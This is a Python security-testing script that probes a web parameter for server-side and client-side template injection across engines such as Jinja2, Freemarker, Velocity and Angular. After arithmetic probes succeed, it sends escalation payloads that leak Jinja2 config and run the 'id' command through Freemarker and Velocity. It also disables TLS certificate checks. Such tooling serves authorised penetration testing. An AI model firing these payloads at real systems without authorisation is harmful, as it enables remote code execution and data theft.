#!/usr/bin/env python3
"""
ssti-probe — Server-Side Template Injection / Client-Side Template Injection detector.

Injects arithmetic polyglots into reflected parameters, detects evaluation in responses.

Engines covered:
  Jinja2 / Twig · Freemarker · Velocity · Mako · Pebble · Smarty
  ERB (Ruby) · Handlebars · Angular (CSTI) · Vue (CSTI)

Strategy:
  1. Baseline: send known-random marker, confirm it reflects.
  2. Arithmetic probe: {{7*7}} / ${7*7} / #{7*7} / <%=7*7%> etc.
     If "49" appears in response (and marker doesn't literally contain "49") → SSTI.
  3. Polyglot: one payload that hits multiple engines at once.
  4. Engine fingerprint: secondary payloads once arithmetic confirmed.

Usage:
  ssti-probe.py --url https://app.acme.com/render --param template
                [--method GET|POST] [--data '{}'] [--token Bearer_xxx]
                [--header X-Custom:val] [--json] [--out results.json]
  ssti-probe.py --url https://app.acme.com/greet --param name  # GET + reflects
Exit: 0 clean · 1 findings.
"""
import sys, re, json, time, ssl, random, string
from pathlib import Path
from urllib.request import urlopen, Request
from urllib.error import HTTPError

def arg(n, d=None):
    return sys.argv[sys.argv.index(n)+1] if n in sys.argv else d
def args_multi(n):
    vals = []
    for i,a in enumerate(sys.argv):
        if a == n and i+1 < len(sys.argv): vals.append(sys.argv[i+1])
    return vals
def flag(n): return n in sys.argv

# arithmetic target = 7*7=49, 7*'7'='7777777' (Jinja), etc.
PROBES = [
    # (label,         payload,                  expected,      engine)
    ("jinja2_basic",  "{{7*7}}",                "49",          "Jinja2/Twig"),
    ("jinja2_str",    "{{7*'7'}}",              "7777777",     "Jinja2"),
    ("twig_str",      "{{7*'7'}}",              "49",          "Twig"),
    ("freemarker",    "${7*7}",                 "49",          "Freemarker/Spring"),
    ("velocity",      "#set($x=7*7)$x",        "49",          "Velocity"),
    ("smarty",        "{math equation='7*7'}",  "49",          "Smarty"),
    ("ruby_erb",      "<%=7*7%>",               "49",          "Ruby ERB"),
    ("mako",          "${7*7}",                 "49",          "Mako"),
    ("el_expr",       "#{7*7}",                 "49",          "EL/OGNL"),
    ("pebble",        "{{7*7}}",                "49",          "Pebble"),
    ("thymeleaf",     "__${7*7}__::__",         "49",          "Thymeleaf"),
    ("golang_tmpl",   "{{printf \"%d\" (mul 7 7)}}", "49",    "Go template"),
    ("polyglot",      "${{<%[%'\"}}%\\.",        None,          "generic (error)"),
    # CSTI
    ("angular_csti",  "{{constructor.constructor('alert(1)')()}}", "1", "Angular CSTI"),
    ("vue_csti",      "{{constructor.constructor('return 1')()}}","1",  "Vue CSTI"),
]

# fingerprint payloads (run after arithmetic confirmed)
FINGERPRINT = [
    ("jinja2_config", "{{config}}", ["from_object","DEBUG","SECRET_KEY"], "Jinja2 config leak"),
    ("jinja2_rce",    "{{''.__class__.mro()[1].__subclasses__()}}", ["subprocess","os","builtins"], "Jinja2 subclass access"),
    ("freemarker_rce","${\"freemarker.template.utility.Execute\"?new()('id')}", ["uid=","root","www-data"], "Freemarker RCE"),
    ("velocity_rce",  "#set($rt=$class.forName('java.lang.Runtime'))$rt.exec('id')", ["uid=","root"], "Velocity RCE"),
]

def build_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    return ctx

def send(url, param, payload, method, token, extra_h, body_tpl, timeout=10):
    import urllib.request, urllib.parse
    ctx = build_ctx()
    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
    headers = {"User-Agent": "Mozilla/5.0", "Accept": "text/html,application/json,*/*"}
    if token: headers["Authorization"] = token if " " in token else f"Bearer {token}"
    for h in (extra_h or []):
        if ":" in h:
            k,v = h.split(":",1); headers[k.strip()] = v.strip()
    data = None
    target = url
    if method.upper() == "GET":
        sep = "&" if "?" in url else "?"
        target = f"{url}{sep}{urllib.parse.quote(param, safe='')}={urllib.parse.quote(payload, safe='')}"
    else:
        try: body = json.loads(body_tpl or "{}")
        except: body = {}
        body[param] = payload
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    req = Request(target, data=data, headers=headers, method=method)
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, r.read(8192).decode("utf-8","ignore")
    except HTTPError as e:
        try: b = e.read(4096).decode("utf-8","ignore")
        except: b = ""
        return e.code, b
    except Exception as ex:
        return 0, str(ex)[:200]

def check_reflects(resp, marker):
    return marker in resp

def check_eval(resp, expected, baseline_resp):
    if not expected: return False
    if expected not in resp: return False
    # make sure it wasn't already in the baseline
    if expected in baseline_resp: return False
    return True

def main():
    url      = arg("--url")
    param    = arg("--param")
    method   = arg("--method","GET").upper()
    token    = arg("--token")
    extra_h  = args_multi("--header")
    body_tpl = arg("--data")
    out_file = arg("--out")

    if not url or not param: print(__doc__); sys.exit(0)

    # random marker for reflection detection
    marker = "ssti" + "".join(random.choices(string.ascii_lowercase+string.digits, k=6))
    print(f"[ssti-probe] {method} {url} param={param} marker={marker}", file=sys.stderr)

    # baseline
    base_status, base_resp = send(url, param, marker, method, token, extra_h, body_tpl)
    reflects = check_reflects(base_resp, marker)
    print(f"[ssti-probe] baseline HTTP {base_status}  reflects={reflects}", file=sys.stderr)
    if not reflects:
        print(f"[ssti-probe] marker not reflected — SSTI unlikely but trying probes anyway", file=sys.stderr)

    findings = []
    engine_confirmed = None

    for label, payload, expected, engine in PROBES:
        print(f"[ssti-probe] trying {label} …", file=sys.stderr)
        status, resp = send(url, param, payload, method, token, extra_h, body_tpl)
        if expected and check_eval(resp, expected, base_resp):
            engine_confirmed = engine
            findings.append({
                "attack": "ssti",
                "label": label,
                "engine": engine,
                "payload": payload,
                "expected": expected,
                "severity": "critical",
                "status": status,
                "response_snippet": resp[:500],
                "note": f"Template injection confirmed: {payload!r} evaluated to '{expected}' in response. Engine: {engine}",
            })
            print(f"  ✓ SSTI CONFIRMED: {label} ({engine})", file=sys.stderr)
            break  # no need to test more once confirmed
        elif expected is None and resp and "error" in resp.lower() and status != base_status:
            findings.append({
                "attack": "ssti_error",
                "label": label,
                "engine": engine,
                "payload": payload,
                "severity": "medium",
                "status": status,
                "response_snippet": resp[:300],
                "note": f"Polyglot caused error response (HTTP {status}) — possible template injection, manual verification needed",
            })

    # fingerprint if arithmetic confirmed
    if engine_confirmed:
        print(f"[ssti-probe] fingerprinting {engine_confirmed} …", file=sys.stderr)
        for label, payload, indicators, note in FINGERPRINT:
            status, resp = send(url, param, payload, method, token, extra_h, body_tpl)
            if any(ind.lower() in resp.lower() for ind in indicators):
                findings.append({
                    "attack": "ssti_rce",
                    "label": label,
                    "engine": engine_confirmed,
                    "payload": payload,
                    "severity": "critical",
                    "status": status,
                    "response_snippet": resp[:400],
                    "note": note + " — RCE/data-leak via SSTI confirmed",
                })
                print(f"  ✓ {label} — escalation confirmed!", file=sys.stderr)

    result = {
        "ts": time.strftime("%Y-%m-%d %H:%M"),
        "url": url, "param": param, "reflects": reflects,
        "engine": engine_confirmed,
        "total": len(findings),
        "critical": sum(1 for f in findings if f["severity"]=="critical"),
        "findings": findings,
    }
    if out_file: Path(out_file).write_text(json.dumps(result, indent=2))

    if flag("--json"):
        print(json.dumps(result)); sys.exit(1 if findings else 0)

    print(f"\n══ SSTI probe · {url} ══════════════════════════")
    print(f"  Param: {param}  Reflects: {reflects}  Engine: {engine_confirmed or 'none detected'}")
    print(f"  Findings: {len(findings)} (critical: {result['critical']})")
    if findings:
        print()
        for f in findings:
            print(f"  [{f['severity'].upper():<8}] {f['label']} ({f['engine']})")
            print(f"             payload: {f['payload'][:60]}")
            print(f"             {f['note'][:100]}")
    else:
        print("  No template injection found with tested payloads.")

    sys.exit(1 if findings else 0)

if __name__ == "__main__":
    main()
